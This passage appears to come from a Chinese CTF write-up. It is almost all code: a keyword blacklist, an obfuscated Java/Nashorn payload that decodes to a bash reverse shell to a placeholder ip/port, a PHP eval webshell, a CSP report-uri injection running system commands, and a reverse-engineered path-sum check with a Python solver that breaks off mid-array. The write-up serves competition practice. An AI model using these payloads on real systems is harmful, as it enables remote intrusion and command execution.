class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br></pre></td><td class="code"><pre><span class="line">&quot;process|runtime|javascript|\+|char|\\|from|\[|\]|load&quot;</span><br><span class="line">java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,ZWNobyxiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream()</span><br><span class="line">%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29</span><br><span class="line">最终exp:</span><br><span class="line">&#123;</span><br><span class="line">&quot;cmd&quot;:&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(java.net.URLDecoder.decode(&quot;%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29&quot;));&quot;,</span><br><span class="line">&quot;x&quot;:&quot;guanzhujiarandundunjiechbO&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;]!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line">    die(&#x27;only from local!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $postdata = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $kv_list = explode(&#x27;&amp;&#x27;,$postdata);</span><br><span class="line">    if(count($kv_list)&gt;0)&#123;</span><br><span class="line">        foreach ($kv_list as $value)&#123;</span><br><span class="line">            $kv = explode(&#x27;=&#x27;,$value);</span><br><span class="line">            if(count($kv)==2)&#123;</span><br><span class="line">                if($kv[0]===&quot;bbzl&#x27;s shell&quot;)&#123;</span><br><span class="line">                    eval($kv[1]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;img-src&quot;,&quot;effective-directive&quot;:&quot;img-src&quot;,&quot;original-policy&quot;:&quot;img-src none; report-uri /shell.php;&amp;bbzl&#x27;s shell=system(&#x27;touch /tmp/1&#x27;);&amp;&quot;,&quot;disposition&quot;:&quot;report&quot;,&quot;blocked-uri&quot;:&quot;[图片已移除]&quot;,&quot;line-number&quot;:2,&quot;source-file&quot;:&quot;http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26&quot;,&quot;status-code&quot;:</span><br><span class="line">200,&quot;script-sample&quot;:&quot;&quot;&#125;&#125;</span><br><span class="line">0x00001251 &lt;+4&gt;:    push   ebp</span><br><span class="line">0x00001252 &lt;+5&gt;:    mov    ebp,esp</span><br><span class="line">0x00001254 &lt;+7&gt;:    sub    esp,0x10</span><br><span class="line">0x00001257 &lt;+10&gt;:    mov    DWORD PTR [ebp-0x10],0x0</span><br><span class="line">0x0000125e &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">0x00001265 &lt;+24&gt;:    mov    eax,DWORD PTR [ebp-0x10]</span><br><span class="line">0x00001268 &lt;+27&gt;:    imul   edx,eax,0xc8</span><br><span class="line">0x0000126e &lt;+33&gt;:    mov    eax,DWORD PTR [ebp+0x10]</span><br><span class="line">0x00001271 &lt;+36&gt;:    add    edx,eax</span><br><span class="line">0x00001273 &lt;+38&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">0x00001276 &lt;+41&gt;:    mov    eax,DWORD PTR [edx+eax*4]</span><br><span class="line">0x00001279 &lt;+44&gt;:    mov    DWORD PTR [ebp-0x8],eax</span><br><span class="line">0x0000127c &lt;+47&gt;:    mov    DWORD PTR [ebp-0x4],0x0</span><br><span class="line">0x00001283 &lt;+54&gt;:    jmp    0x12dd &lt;verify+144&gt;</span><br><span class="line">0x00001285 &lt;+56&gt;:    mov    edx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x00001288 &lt;+59&gt;:    mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">0x0000128b &lt;+62&gt;:    add    eax,edx</span><br><span class="line">0x0000128d &lt;+64&gt;:    movzx  eax,BYTE PTR [eax]</span><br><span class="line">0x00001290 &lt;+67&gt;:    cmp    al,0x52</span><br><span class="line">0x00001292 &lt;+69&gt;:    jne    0x12a0 &lt;verify+83&gt;</span><br><span class="line">0x00001294 &lt;+71&gt;:    cmp    DWORD PTR [ebp-0xc],0x30</span><br><span class="line">0x00001298 &lt;+75&gt;:    jg     0x12a0 &lt;verify+83&gt;</span><br><span class="line">0x0000129a &lt;+77&gt;:    add    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">0x0000129e &lt;+81&gt;:    jmp    0x12c2 &lt;verify+117&gt;</span><br><span class="line">0x000012a0 &lt;+83&gt;:    mov    edx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x000012a3 &lt;+86&gt;:    mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">0x000012a6 &lt;+89&gt;:    add    eax,edx</span><br><span class="line">0x000012a8 &lt;+91&gt;:    movzx  eax,BYTE PTR [eax]</span><br><span class="line">0x000012ab &lt;+94&gt;:    cmp    al,0x44</span><br><span class="line">0x000012ad &lt;+96&gt;:    jne    0x12bb &lt;verify+110&gt;</span><br><span class="line">0x000012af &lt;+98&gt;:    cmp    DWORD PTR [ebp-0x10],0x30</span><br><span class="line">0x000012b3 &lt;+102&gt;:    jg     0x12bb &lt;verify+110&gt;</span><br><span class="line">0x000012b5 &lt;+104&gt;:    add    DWORD PTR [ebp-0x10],0x1</span><br><span class="line">0x000012b9 &lt;+108&gt;:    jmp    0x12c2 &lt;verify+117&gt;</span><br><span class="line">0x000012bb &lt;+110&gt;:    mov    eax,0x0</span><br><span class="line">0x000012c0 &lt;+115&gt;:    jmp    0x12f1 &lt;verify+164&gt;</span><br><span class="line">0x000012c2 &lt;+117&gt;:    mov    eax,DWORD PTR [ebp-0x10]</span><br><span class="line">0x000012c5 &lt;+120&gt;:    imul   edx,eax,0xc8</span><br><span class="line">0x000012cb &lt;+126&gt;:    mov    eax,DWORD PTR [ebp+0x10]</span><br><span class="line">0x000012ce &lt;+129&gt;:    add    edx,eax</span><br><span class="line">0x000012d0 &lt;+131&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">0x000012d3 &lt;+134&gt;:    mov    eax,DWORD PTR [edx+eax*4]</span><br><span class="line">0x000012d6 &lt;+137&gt;:    add    DWORD PTR [ebp-0x8],eax</span><br><span class="line">0x000012d9 &lt;+140&gt;:    add    DWORD PTR [ebp-0x4],0x1</span><br><span class="line">0x000012dd &lt;+144&gt;:    mov    eax,DWORD PTR [ebp-0x4]</span><br><span class="line">0x000012e0 &lt;+147&gt;:    cmp    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">0x000012e3 &lt;+150&gt;:    jl     0x1285 &lt;verify+56&gt;</span><br><span class="line">0x000012e5 &lt;+152&gt;:    mov    eax,DWORD PTR [ebp-0x8]</span><br><span class="line">0x000012e8 &lt;+155&gt;:    cmp    eax,DWORD PTR [ebp+0x14]</span><br><span class="line">0x000012eb &lt;+158&gt;:    sete   al</span><br><span class="line">0x000012ee &lt;+161&gt;:    movzx  eax,al</span><br><span class="line">0x000012f1 &lt;+164&gt;:    leave  </span><br><span class="line">0x000012f2 &lt;+165&gt;:    ret</span><br><span class="line">int verify(const char* input, int size, int map[50][50], int max_val) &#123;</span><br><span class="line">    int x=0, y=0;</span><br><span class="line">    int sum = map[x][y];</span><br><span class="line">    for(int i = 0;i&lt;size;++i) &#123;</span><br><span class="line">        if(input[i] == &#x27;R&#x27; &amp;&amp; y&lt;49) &#123;</span><br><span class="line">            ++y;</span><br><span class="line">        &#125; else if (input[i]==&#x27;D&#x27; &amp;&amp; x&lt;49) &#123;</span><br><span class="line">            ++x;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += map[x][y];</span><br><span class="line">    &#125;</span><br><span class="line">    return sum == max_val;</span><br><span class="line">&#125;</span><br><span class="line">def get_solution(arr):</span><br><span class="line">    dp = [[0 for j in range(50)] for i in range(50)]</span><br><span class="line">    dp[0][0] = arr[0][0]</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        dp[0][i] = dp[0][i-1] + arr[0][i]</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        dp[i][0] = dp[i-1][0] + arr[i][0]</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        for j in range(1, 50):</span><br><span class="line">            dp[i][j] = max(dp[i][j-1], dp[i-1][j]) + arr[i][j]</span><br><span class="line"></span><br><span class="line">    max_val = 0</span><br><span class="line">    max_idx = 0</span><br><span class="line">    for i in range(50):</span><br><span class="line">        if dp[49][i] &gt; max_val:</span><br><span class="line">            max_val = dp[49][i]</span><br><span class="line">            max_idx = i</span><br><span class="line"></span><br><span class="line">    if dp[49].count(max_val) &gt; 1:</span><br><span class="line">        #print(&quot;Multi solution!&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    sol = &quot;&quot;</span><br><span class="line">    level = 49</span><br><span class="line">    while level &gt; 0:</span><br><span class="line">        if max_idx &gt; 0:</span><br><span class="line">            if dp[level][max_idx-1] &gt; dp[level-1][max_idx]:</span><br><span class="line">                sol = &quot;R&quot; + sol</span><br><span class="line">                max_idx = max_idx - 1</span><br><span class="line">            elif dp[level][max_idx-1] &lt; dp[level-1][max_idx]:</span><br><span class="line">                sol = &quot;D&quot; + sol</span><br><span class="line">                level = level - 1</span><br><span class="line">            else:</span><br><span class="line">                #print(&quot;Multi solution!&quot;)</span><br><span class="line">                return None</span><br><span class="line">        else:</span><br><span class="line">            sol = &quot;D&quot; + sol</span><br><span class="line">            level = level - 1</span><br><span class="line"></span><br><span class="line">    for i in range(max_idx):</span><br><span class="line">        sol = &quot;R&quot; + sol</span><br><span class="line"></span><br><span class="line">    return sol, max_val, dp</span><br><span class="line"></span><br><span class="line">arr = [</span><br><span class="line">  [31,59,162,34,11,176,34,153,214,239,218,184,200,169,189,168,168,75,172,184,132,174,33,214,238,31,71,144,229,209,235,214,39,53,19,190,222,192,31,92,55,29,6,239,233,157,64,88,94,239],</span><br><span class="line">  [11,117,166,47,72,16,6,70,190,177,110,123,56,36,209,44,152,130,13,162,35,11,112,187,92,226,123,192,209,201,132,150,100,188,253,120,210,247,172,25,63,74,86,208,60,38,9,151,108,99],</span><br><span class="line">  [45,117,151,132,252,117,105,170,183,87,123,43,45,207,162,13,146,114,76,220,209,31,178,84,210,196,221,62,36,12,1,155,86,150,220,204,145,228,119,38,240,107,137,105,227,18,185,78,36,24],</span><br><span class="line">  [240,122,104,46,183,177,96,65,65,222,69,211,192,222,233,7,36,34,55,139,154,135,95,36,124,94,133,61,208,140,223,194,176,156,243,68,51,83,138,235,30,249,172,151,121,171,172,205,147,53],</span><br><span class="line">  [90,14,62,152,181,58,208,251,210,178,70,37,235,45,88,78,219,183,103,35,19,173,232,160,13,36,250,252,214,33,176,190,115,113,216,210,160,150,100,237,4,37,10,110,139,6,68,252,53,22],</span><br><span class="line">  [154,7,3,33,93,55,42,111,112,137,228,172,208,111,68,110,48,20,238,226,110,54,42,164,64,211,226,228,29,3,50,206,141,220,244,59,155,19,195,129,105,188,181,151,232,204,209,149,211,22],</span><br><span class="line">  [155,113,94,226,183,51,57,202,68,84,222,44,32,71,172,100,22,15,153,91,97,183,62,48,149,51,235,122,208,161,24,142,1,215,223,234,162,158,228,193,146,182,85,175,133,138,15,225,24,182],</span><br><span class="line">  [182,177,51,87,231,126,112,84,173,206,223,2,137,76,216,125,132,229,59,52,134,65,195,112,122,190,250,23,240,70,182,39,171,255,67,143,84,53,254,238,238,25,143,17,249,211,72,121,109,57],</span><br><span class="line">  [245,140,112,220,67,65,112,52,46,186,252,130,249,236,194,92,196,53,211,179,91,119,83,6,184,205,248,233,159,130,204,130,143,171,227,30,167,23,146,134,166,11,128,64,251,119,160,23,59,24],</span><br><span class="line">  [162,54,17,217,11,127,203,183,251,171,237,202,188,202,52,39,109,175,127,193,11,248,10,99,212,8,183,147,134,228,111,148,13,50,186,67,85,16,242,216,192,128,129,28,82,15,173,129,92,224],</span><br><span class="line">  [119,69,43,81,75,180,69,109,11,250,14,241,124,193,137,144,53,175,165,39,211,135,247,173,243,253,44,213,92,192,145,138,217,104,18,82,252,101,135,90,55,115,248,235,256,139,78,42,239,17],</span><br><span class="line">  [132,221,29,180,170,62,26,140,34,199,161,66,66,28,250,53,237,42,223,5,42,15,31,109,68,141,35,239,142,5,80,12,75,123,12,181,139,131,167,173,72,107,150,252,242,106,240,12,79,147],</span><br><span class="line">  [194,65,155,224,195,186,208,73,221,132,120,73,110,28,91,204,111,199,127,164,166,204,250,11,209,209,81,237,146,125,233,177,79,140,175,44,13,56,179,82,80,227,167,105,170,13,248,251,72,152],</span><br><span class="line">  [222,223,7,195,246,248,255,115,188,106,85,117,244,35,191,43,135,254,172,234,101,70,105,96,30,248,37,39,168,256,156,24,130,96,169,99,93,136,223,151,76,71,101,239,178,188,11,191,82,2],</span><br><span class="line">  [41,15,2,40,221,165,207,22,81,239,150,139,161,78,246,87,120,70,121,125,244,238,176,56,35,173,24,196,47,66,197,228,153,55,204,151,251,81,87,184,43,247,226,155,62,219,65,38,48,241],</span><br><span class="line">  [226,163,167,252,187,253,65,138,251,229,236,203,79,71,213,55,36,232,29,173,156,41,174,131,90,31,129,14,66,247,153,122,228,192,14,180,118,223,213,255,53,143,205,1,166,189,155,19,13,116],</span><br><span class="line">  [111,115,183,159,38,251,99,65,84,84,97,247,217,188,2,80,141,149,173,115,131,141,72,107,106,203,162,90,20,47,156,99,99,56,121,190,240,201,87,156,0,96,196,12,122,175,24,195,73,184],</span><br><span class="line">  [116,17,63,197,252,226,159,220,105,247,138,234,171,86,187,108,11,104,123,207,255,122,24,62,249,217,50,231,54,64,134,5,140,239,171,125,128,115,178,120,107,46,64,125,78,112,128,241,24,27],</span><br><span class="line">  [74,163,34,13,2,168,126,60,219,19,31,82,44,175,124,8,223,32,12,208,119,36,206,110,61,210,157,202,228,96,199,115,77,109,160,78,194,124,73,254,141,1,97,249,12,27,153,193,51,207],</span><br><span class="line">  [78,182,92,255,94,256,244,173,51,197,28,34,178,143,173,197,94,132,194,244,24,240,3,162,66,68,182,102,20,71,131,142,105,122,121,157,61,185,203,227,110,110,117,5,225,73,57,129,132,25],</span><br><span class="line">  [100,113,138,85,153,115,154,167,132,80,36,23,111,86,221,42,196,98,113,89,175,19,145,140,150,51,6,21,184,213,162,101,252,115,36,165,186,145,176,8,102,1,206,30,119,56,130,185,61,226],</span><br><span class="line">  [109,237,182,134,35,117,127,49,111,90,141,83,239,141,60,105,214,107,62,25,250,133,254,105,97,141,187,230,110,180,178,192,206,49,242,71,138,168,105,57,63,247,47,148,80,5,117,123,147,188],</span><br><span class="line">  [136,10,134,193,227,229,232,185,119,238,123,0,172,27,17,73,1,86,43,41,188,16,90,146,229,230,3,215,25,193,143,232,17,193,195,256,242,38,182,73,25,140,17,178,89,78,247,1,133,22],</span><br><span class="line">  